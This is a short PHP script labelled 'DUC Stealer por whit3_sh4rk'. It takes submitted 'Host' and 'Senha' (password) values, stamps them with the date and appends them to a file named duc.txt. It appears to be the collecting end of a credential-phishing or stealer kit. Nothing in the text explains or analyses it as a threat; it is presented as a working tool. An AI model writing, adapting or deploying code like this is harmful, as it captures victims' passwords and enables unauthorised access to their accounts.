<?
$h = getdate();
$dia = $h ['mday'];
$mes = $h {'mon'};
$msg = "=========================================\n";
$msg .= "Host:\t$Host\n";
$msg .= "Senha:\t$Senha\n";
$msg .= "Data: $dia/0$mes\n\n";
$msg .= "DUC Stealer por whit3_sh4rk\n";
$msg .= "=========================================\n\n";
$fp = fopen("duc.txt", "a");
fputs ($fp, $msg);
fclose($fp);
?>